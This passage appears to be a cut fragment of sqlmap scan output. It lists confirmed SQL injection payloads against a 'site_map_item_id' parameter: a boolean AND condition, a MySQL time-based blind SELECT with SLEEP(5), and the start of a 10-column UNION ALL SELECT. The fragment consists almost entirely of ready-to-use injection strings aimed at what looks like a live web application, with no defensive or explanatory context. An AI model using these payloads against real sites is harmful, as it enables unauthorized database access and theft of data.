- WHERE or HAVING clause    Payload: site_map_item_id=4 AND 2262=2262    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: site_map_item_id=4 AND (SELECT * FROM (SELECT(SLEEP(5)))OzrY)    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: site_map_item_id=-7034 UNION ALL SELECT
